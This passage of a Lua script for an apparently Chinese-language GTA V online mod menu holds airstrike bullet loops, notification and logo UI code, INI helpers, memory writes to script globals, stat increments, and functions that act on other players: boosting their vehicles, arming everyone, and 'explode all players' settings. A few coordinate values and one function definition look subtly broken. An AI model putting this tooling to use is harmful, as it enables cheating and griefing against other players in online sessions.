    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 23 , pos.x-2, pos.y, pos.z + 23, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 23 , pos.x-2, pos.y-2, pos.z + 23, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 23 , pos.x-2, pos.y+2, pos.z + 23, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 25 , pos.x, pos.y, pos.z + 25, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 25 , pos.x+2, pos.y, pos.z + 25, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 25 , pos.x-2, pos.y, pos.z + 25, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 25 , pos.x-2, pos.y-2, pos.z + 25, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 25 , pos.x-2, pos.y+2, pos.z + 25, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 27 , pos.x, pos.y, pos.z + 27, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 27 , pos.x+2, pos.y, pos.z + 27, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 27 , pos.x-2, pos.y, pos.z + 27, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 27 , pos.x-2, pos.y-2, pos.z + 27, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 27 , pos.x-2, pos.y+2, pos.z + 27, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 29 , pos.x, pos.y, pos.z + 29, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 29 , pos.x+2, pos.y, pos.z + 29, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 29 , pos.x-2, pos.y, pos.z + 29, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 29 , pos.x-2, pos.y-2, pos.z + 29, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 29 , pos.x-2, pos.y+2, pos.z + 29, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 31 , pos.x, pos.y, pos.z + 31, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 31 , pos.x+2, pos.y, pos.z + 31, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 31 , pos.x-2, pos.y, pos.z + 31, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 31 , pos.x-2, pos.y-2, pos.z + 31, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 31 , pos.x-2, pos.y+2, pos.z + 31, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 33 , pos.x, pos.y, pos.z + 33, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 33 , pos.x+2, pos.y, pos.z + 33, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-22, pos.y, pos.z+ 33 , pos.x-2, pos.y, pos.z + 33, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 33 , pos.x-2, pos.y-2, pos.z + 33, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 33 , pos.x-2, pos.y+2, pos.z + 3, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 35 , pos.x, pos.y, pos.z + 35, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 35 , pos.x+2, pos.y, pos.z + 35, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 35 , pos.x-2, pos.y, pos.z + 35, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-22, pos.y-2, pos.z+ 35 , pos.x-2, pos.y-2, pos.z + 35, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 35 , pos.x-2, pos.y+2, pos.z + 35, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 37 , pos.x, pos.y, pos.z + 37, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 37 , pos.x+2, pos.y, pos.z + 37, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 37 , pos.x-2, pos.y, pos.z + 37, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 37 , pos.x-2, pos.y-2, pos.z + 37, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 37 , pos.x-2, pos.y+2, pos.z + 37, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 39 , pos.x, pos.y, pos.z + 39, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 39 , pos.x+2, pos.y, pos.z + 39, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 39 , pos.x-2, pos.y, pos.z + 39, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 39 , pos.x-2, pos.y-2, pos.z + 39, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 39 , pos.x-2, pos.y+2, pos.z + 39, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 41 , pos.x, pos.y, pos.z + 41, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 41 , pos.x+2, pos.y, pos.z + 41, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 41 , pos.x-2, pos.y, pos.z + 41, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 41 , pos.x-2, pos.y-2, pos.z + 41, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 41 , pos.x-2, pos.y+2, pos.z + 41, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 43 , pos.x, pos.y, pos.z + 43, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 43 , pos.x+2, pos.y, pos.z + 43, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 43 , pos.x-2, pos.y, pos.z + 43, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 43 , pos.x-2, pos.y-2, pos.z + 43, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 43 , pos.x-2, pos.y+2, pos.z + 43, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 45 , pos.x, pos.y, pos.z + 45, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 45 , pos.x+2, pos.y, pos.z + 45, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 45 , pos.x-2, pos.y, pos.z + 45, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 45 , pos.x-2, pos.y-2, pos.z + 45, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 45 , pos.x-2, pos.y+2, pos.z + 45, 10000, true, airshash, players.user_ped(), false, true, 10000)
end

function pid_to_handle(pid)
NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid, memory.alloc(13*8), 13)
    return memory.alloc(13*8)
end

function newColor(R, G, B, A)
    return {r = R, g = G, b = B, a = A}
end

function new.colour(R, G, B, A)
    return {r = R / 255, g = G / 255, b = B / 255, a = A or 1}
end

local white = new.colour( 255, 255, 255 )
local darkBlue = new.colour( 132, 207, 255 )

b_notifications = {}
b_notifications.new = function ()
    local self = {}
    local active_notifs = {}
    self.notif_padding = 0.005
    self.notif_text_size = 0.55
    self.notif_title_size = 0.6
    self.notif_spacing = 0.015
    self.notif_width = 0.16
    self.notif_flash_duration = 1
    self.notif_anim_speed = 0.75
    self.notif_banner_colour = {r = 1, g = 0.51, b = 0.61, a = 1}
    self.notif_flash_colour = {r = 1, g = 0.34, b = 0.47, a = 1}
    self.max_notifs = 10
    self.notif_banner_height = 0.002
    self.use_toast = false
    local split = function (input, sep)
    local t={}
    for str in string.gmatch(input, "([^"..sep.."]+)") do
    table.insert(t, str)
    end
    return t
    end
    local function lerp(a, b, t)
    return a + (b - a) * t
    end
    local cut_string_to_length = function(input, length, fontSize)
    input = split(input, " ")
    local output = {}
    local line = ""
    for i, word in ipairs(input) do
    if directx.get_text_size(line..word, fontSize) >= length then
    if directx.get_text_size(word, fontSize) > length then
    while directx.get_text_size(word , fontSize) > length do
    local word_lenght = string.len(word)
    for x = 1, word_lenght, 1 do
    if directx.get_text_size(line..string.sub(word ,1, x), fontSize) > length then
    output[#output+1] = line..string.sub(word, 1, x - 1)
    line = ""
    word = string.sub(word, x, word_lenght)
    break
    end
    end
    end
    else
    output[#output+1] =  line
    line = ""
    end
    end
    if i == #input then
    output[#output+1] = line..word
    end
    line = line..word.." "
    end
    return table.concat(output, "\n")
    end
    local draw_notifs = function ()
    local aspect_16_9 = 1.777777777777778
    util.create_tick_handler(function ()
    local total_height = 0
    local delta_time = MISC.GET_FRAME_TIME()
    for i = #active_notifs, 1, -1 do
    local notif = active_notifs[i]
    local notif_body_colour = notif.colour
    if notif.flashtimer > 0 then
    notif_body_colour = self.notif_flash_colour
    notif.flashtimer = notif.flashtimer - delta_time
    end
    if notif.current_y_pos == -10 then
    notif.current_y_pos = total_height
    end
    notif.current_y_pos = lerp(notif.current_y_pos, total_height, 5 * delta_time * self.notif_anim_speed)
    if not notif.marked_for_deletetion then
    notif.animation_state = lerp(notif.animation_state, 1, 10 * delta_time * self.notif_anim_speed)
    end
    directx.draw_rect(
    1 - self.notif_width - self.notif_padding * 2,
    0.1 - self.notif_padding * 2 * aspect_16_9 + notif.current_y_pos,
    self.notif_width + (self.notif_padding * 2),
    (notif.text_height + notif.title_height + self.notif_padding * 2 * aspect_16_9) * notif.animation_state,
    notif_body_colour
    )
    directx.draw_rect(
    1 - self.notif_width - self.notif_padding * 2,
    0.1 - self.notif_padding * 2 * aspect_16_9 + notif.current_y_pos,
    self.notif_width + (self.notif_padding * 2),
    self.notif_banner_height * aspect_16_9 * notif.animation_state,
    self.notif_banner_colour
    )
    directx.draw_text(
    1 - self.notif_padding - self.notif_width,
    0.1 - self.notif_padding * aspect_16_9 + notif.current_y_pos,
    notif.title,
    ALIGN_TOP_LEFT,
    self.notif_title_size,
   {r = 1 * notif.animation_state, g = 1 * notif.animation_state, b = 1 * notif.animation_state, a = 1 * notif.animation_state}
    )
    directx.draw_text(
    1 - self.notif_padding - self.notif_width,
    0.1 - self.notif_padding * aspect_16_9 + notif.current_y_pos + notif.title_height,
    notif.text,
    ALIGN_TOP_LEFT,
    self.notif_text_size,
    {r = 1 * notif.animation_state, g = 1 * notif.animation_state, b = 1 * notif.animation_state, a = 1 * notif.animation_state}
    )
    total_height = total_height + ((notif.total_height + self.notif_padding * 2 + self.notif_spacing) * notif.animation_state)
    if notif.marked_for_deletetion then
    notif.animation_state = lerp(notif.animation_state, 0, 10 * delta_time)
    if notif.animation_state < 0.05 then
    table.remove(active_notifs, i)
    end
    elseif notif.duration < 0 then
    notif.marked_for_deletetion = true
    end
    notif.duration = notif.duration - delta_time
    end
    return #active_notifs > 0
    end)
    end
   self.notify = function (title,text, duration, colour)
   if self.use_toast then
   util.toast(title.."\n"..text)
   return
   end
   title = cut_string_to_length(title, self.notif_width, self.notif_title_size)
   text = cut_string_to_length(text, self.notif_width, self.notif_text_size)
   local x, text_heigth = directx.get_text_size(text, self.notif_text_size)
   local xx, title_height = directx.get_text_size(title, self.notif_title_size)
   local hash = util.joaat(title..text)
   local new_notification = {
   title = title,
   flashtimer = self.notif_flash_duration,
   colour = colour or {r = 0.094, g = 0.098, b = 0.101, a = 0.6},
   duration = duration or 3,
   current_y_pos = -10,
   marked_for_deletetion = false,
   animation_state = 0,
   text = text,
   hash = hash,
   text_height = text_heigth,
   title_height = title_height,
   total_height = title_height + text_heigth
   }
   for i, notif in ipairs(active_notifs) do
   if notif.hash == hash then
   notif.flashtimer = self.notif_flash_duration * 0.5
   notif.marked_for_deletetion = false
   notif.duration = duration or 3
   return
   end
   end
   active_notifs[#active_notifs+1] = new_notification
   if #active_notifs > self.max_notifs then
   table.remove(active_notifs, 1)
   end
   if #active_notifs == 1 then draw_notifs() end
   end
   return self
   end

local mayonotification = b_notifications.new()
function notification(input)
    mayonotification.notify("GRANDTOURINGVIP",input)
end

scripts_dir = filesystem.scripts_dir()
if not filesystem.exists(scripts_dir) then
	notification("目录未找到",colors.red)
end
--Logo 在脚本开启时弹出
if SCRIPT_MANUAL_START then
MISC.FORCE_LIGHTNING_FLASH()
end
if SCRIPT_MANUAL_START then
    util.create_thread(function()
        local photo = directx.create_texture(filesystem.scripts_dir() .. "GTLuaScript/GT.png")
        local l = -100
        while l <= 90 do
            for j = 1, 195, 5 do
                directx.draw_texture(photo, 0.06, 0.06, 0.5, -1.1, l/1500, 0.50, 0, {r = 1, g = 1, b = 1, a = j/255})
                wait(0)
                l = l + 5
            end
        end
        for i = 1, 320 do
            directx.draw_texture(photo, 0.06, 0.06, 0.5, -1.1, 0.06, 0.50, 0, {r = 1, g = 1, b = 1, a = 255})
            wait(0)
        end
        local k = 90
        while k >= -10 do
            for j = 195, 1, -5 do
                directx.draw_texture(photo, 0.06, 0.06, 0.5, -1.1, k/1500, 0.50, 0, {r = 1, g = 1, b = 1, a = j/255})
                wait(0)
                k = k - 5
            end
        end
    end)
end
--
--[[local logo = directx.create_texture(filesystem.scripts_dir() ..'GTLuaScript/GT.png')

if not SCRIPT_SILENT_START then
MISC.FORCE_LIGHTNING_FLASH()
end

if not SCRIPT_SILENT_START then
util.create_thread(function()
local size = 0.011
local l = 1
while l < 50 do
directx.draw_texture(logo, size, size, 0.5, 0.5, 0.5, (1 - l / 250) + 0.03, 0, {r = 1, g = 1, b = 1, a = l / 50})
wait()
l += 5 - math.abs(math.floor(l / 10))
end
l = 1
while l < 50 do
directx.draw_texture(logo, size, size, 0.5, 0.6, 0.5 - l / 500, 0.83, 0, white)
wait()
l += 5 - math.abs(math.floor(l / 10))
end
AUDIO.PLAY_SOUND(-1, "signal_on", "DLC_GR_Ambushed_Sounds", 0, 0, white)
for i = 1, 360 do
directx.draw_texture(logo, size, size, 0.5, 0.5, 0.38, 0.83, i / 150, white)
if i < 150 then
directx.draw_text(0.45, 0.83 + (i / 2500), '正在加载GTMENU', ALIGN_TOP_CENTRE, 0.65, white, false)
elseif i > 170 then
directx.draw_text(0.45, 0.83 + ((i - 150) / 2500), '已成功加载GTMENU', ALIGN_TOP_CENTRE, 0.65, white, false)
end
wait()
end
for i = 1, 360 do
directx.draw_texture(logo, size, size, 0.5, 0.5, 0.38, 0.83, i / 150, white)
if i < 150 then
directx.draw_text(0.45, 0.83 + (i / 2500)," 检测用户".. PLAYER.GET_PLAYER_NAME(players.user()).. "", ALIGN_TOP_CENTRE, 0.65, white, false)
end
wait()
end
l = 50
while l >= 0 do
directx.draw_texture(logo, size, size, 0.5, 0.5, 0.5 - l / 500, 0.83, 0, white)
wait()
l -= 6 - math.abs(math.floor(l / 10))
end
l = 50
while l >= 0 do
directx.draw_texture(logo, size, size, 0.5, 0.5, 0.5, (1 - l / 250) + 0.03, 0, {r = 1, g = 1, b = 1, a = l / 50})
wait()
l -= 6 - math.abs(math.floor(l / 10))
end
end)
end]]

function Ini.save(fileName, obj)
local file <close> = assert(io.open(fileName, "w"), "error loading file")
local s = {}
for section, tbl in pairs(obj) do
assert(type(tbl) == "table", "expected field " .. section .. " to be a table, got " .. type(tbl))
local l = {}
table.insert(l, string.format("[%s]", section))
for k, v in pairs(tbl) do table.insert(l, string.format("%s=%s", k, v)) end
table.insert(s, table.concat(l, '\n') .. '\n')
end
file:write(table.concat(s, '\n'))
end

function Ini.load(fileName)
assert(type(fileName) == "string", "fileName must be a string")
local file <close> = assert(io.open(fileName, "r"), "error loading file: " .. fileName)
local data = {}
local section
for line in io.lines(fileName) do
local tempSection = string.match(line, '^%[([^%]]+)%]$')
if tempSection ~= nil then
section = tonumber(tempSection) and tonumber(tempSection) or tempSection
data[section] = data[section] or {}
end
local param, value = string.match(line, '^([%w_]+)%s*=%s*(.+)$')
if section ~= nil and param and value ~= nil then
if value == "true" then
value = true
elseif value == "false" then
value = false
elseif tonumber(value) then
value = tonumber(value)
end
data[section][tonumber(param) or param] = value
end
end
return data
end

TTPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
TTPos = ENTITY.GET_ENTITY_COORDS(TTPed, true)
hud_rgb_index = 1
hud_rgb_colors = {6, 18, 9}
cTime = util.current_time_millis
Version = "6.28"

function give_car_addon(pid, hash, center, ang)
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    local pos = ENTITY.GET_ENTITY_COORDS(car, true)
    pos.x = pos['x']
    pos.y = pos['y']
    pos.z = pos['z']
    request_model_load(hash)
    local ramp = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, pos['x'], pos['y'], pos['z'], true, false, false)
    local size = get_model_size(ENTITY.GET_ENTITY_MODEL(car))
    if center then
        ENTITY.ATTACH_ENTITY_TO_ENTITY(ramp, car, 0, 0.0, 0.0, 0.0, 0.0, 0.0, ang, true, true, true, false, 0, true)
    else
        ENTITY.ATTACH_ENTITY_TO_ENTITY(ramp, car, 0, 0.0, size['y']+1.0, 0.0, 0.0, 0.0, ang, true, true, true, false, 0, true)
    end
end

local function SF_ff9()
    local scaleform = require('GTSCRIPTS.Z')
    local sf = scaleform('instructional_buttons')
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(6)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(7)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(8)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(9)
    memory.write_int(memory.script_global(1645739+1121), 1)
    sf.CLEAR_ALL()
    sf.TOGGLE_MOUSE_BUTTONS(false)
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTON(0, 86, true), '爆炸 或 推开按')
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end

function show_custom_alert_until_enter(l1)
    poptime = os.time()
    while true do
        if PAD.IS_CONTROL_JUST_RELEASED(18, 18) then
            if os.time() - poptime > 0.1 then
                break
            end
        end
        native_invoker.begin_call()
        native_invoker.push_arg_string("ALERT")
        native_invoker.push_arg_string("JL_INVITE_ND")
        native_invoker.push_arg_int(2)
        native_invoker.push_arg_string("")
        native_invoker.push_arg_bool(true)
        native_invoker.push_arg_int(-1)
        native_invoker.push_arg_int(-1)
        native_invoker.push_arg_string(l1)
        native_invoker.push_arg_int(0)
        native_invoker.push_arg_bool(true)
        native_invoker.push_arg_int(0)
        native_invoker.end_call("701919482C74B5AB")
        wait()
    end
end
--弹射起步
function boost_player_vehicle_forward(pid)
    local player_ped = PLAYER.GET_PLAYER_PED(pid)
    local player_vehicle = get_vehicle_ped_is_in(player_ped, include_last_vehicle_for_player_functions)
    if player_vehicle == 0 then
        util.toast(players.get_name(pid) .. " 不在车中.")
    else
        request_control(player_vehicle)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(player_vehicle, 1, 0.0, 1000.0, 0.0, true, true, true, true)
        announce(players.get_name(pid) .. "'车辆猛冲.")
    end
end

function get_vehicle_ped_is_in(ped, includeLastVehicle)
    if includeLastVehicle or PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
        return PED.GET_VEHICLE_PED_IS_IN(ped, false)
    end
    return 0
end

function announce(string)
    if announce_actions then
        util.toast(string)
    end
end

function loadModel(hash)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do wait() end
end
--爆炸所有玩家
        expSettings = {
            camShake = 0, invisible = false, audible = true, noDamage = false, owned = false, blamed = false, blamedPlayer = false, expType = 0,
            colour = new.colour( 255, 0, 255 )
        }
--一键雪球
function yijianxueqiu()
local plist = players.list()
    local snowballs = util.joaat('WEAPON_SNOWBALL')
    for i = 1, #plist do
        local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plist[i])
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(plyr, snowballs, 20, true)
        WEAPON.SET_PED_AMMO(plyr, snowballs, 20)
        wait()
    end
    util.toast("已获得雪球 x10")
end
--一键烟花
function yijianyanhua()
local plist = players.list()
local fireworks = util.joaat('weapon_firework')
for i = 1, #plist do
    local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plist[i])
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(plyr, fireworks, 20, true)
    WEAPON.SET_PED_AMMO(plyr, fireworks, 20)
    wait()
end
util.toast("已获得烟花发射器(20发) x1")
end
--绘制文字
function draw_string(s, x, y, scale, font)
	HUD.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("STRING")
	HUD.SET_TEXT_FONT(font or 0)
	HUD.SET_TEXT_SCALE(scale, scale)
	HUD.SET_TEXT_DROP_SHADOW()
	HUD.SET_TEXT_WRAP(0.0, 1.0)
	HUD.SET_TEXT_DROPSHADOW(1, 0, 0, 0, 0)
	HUD.SET_TEXT_OUTLINE()
	HUD.SET_TEXT_EDGE(1, 0, 0, 0, 0)
	HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(s)
	HUD.END_TEXT_COMMAND_DISPLAY_TEXT(x, y)
end
--彩虹颜色
local mcxh=1

local mcr=255

local mcg=0

local mcb=0
function rainbow_color()
        if mcxh==1 and mcg<256 then

            HUD.SET_TEXT_COLOUR(mcr, mcg, mcb, 255)	

            if mcg == 255 then

                mcxh=2

            else

                mcg=mcg+1

            end

        elseif mcxh==2 and mcr>-1 then

            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)

            if mcr == 0 then

                mcxh=3

            else

                mcr=mcr-1

            end

        elseif mcxh==3 and mcb<256 then

            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)

            if mcb == 255 then

                mcxh=4

            else

                mcb=mcb+1

            end

        elseif mcxh==4 and mcg>-1 then

            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)

            if mcg == 0 then

                mcxh=5

            else

                mcg=mcg-1

            end

        elseif mcxh==5 and mcr<256 then

            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)

            if mcr == 255 then

                mcxh=6

            else

                mcr=mcr+1

            end

        elseif mcxh==6 and mcb>-1 then

            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)

            if mcb == 0 then

                mcxh=1

            else

                mcb=mcb-1

            end

        end
end

function HIDE(scaleform)
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "HIDE")
	GRAPHICS.BEGIN_TEXT_COMMAND_SCALEFORM_STRING("STRING")
	HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME("presents")
	GRAPHICS.END_TEXT_COMMAND_SCALEFORM_STRING()
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.16)
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end
local function get_offset_from_gameplay_camera(distance)
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = v3.toDir(cam_rot)
    local destination = v3(direction)
    destination:mul(distance)
    destination:add(cam_pos)

    return destination
end
local function raycast_gameplay_cam(distance)
    local result = {}
    local didHit = memory.alloc(1)
    local endCoords = v3()
    local surfaceNormal = v3()
    local hitEntity = memory.alloc_int()

    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = v3.toDir(cam_rot)

    local destination = v3(direction)
    destination:mul(distance)
    destination:add(cam_pos)

    local handle = SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(cam_pos.x, cam_pos.y, cam_pos.z, destination.x, destination.y, destination.z, -1, players.user_ped(), 4)
    SHAPETEST.GET_SHAPE_TEST_RESULT(handle, didHit, memory.addrof(endCoords), memory.addrof(surfaceNormal), hitEntity)

    result.didHit = memory.read_byte(didHit) ~= 0
    result.endCoords = endCoords
    result.surfaceNormal = surfaceNormal
    result.hitEntity = memory.read_int(hitEntity)
    return result
end

nuke_height = 10
function lhgd(value)
    nuke_height = value
end
function STAT_SET_INCREMENT(Stat, Value)
    if string.find(Stat, "MPPLY_") or string.find(Stat, "MP_") then
        STATS.STAT_INCREMENT(util.joaat(Stat), Value, true)
    else
        STATS.STAT_INCREMENT(util.joaat(MP_INDEX() .. Stat), Value, true)
    end
end
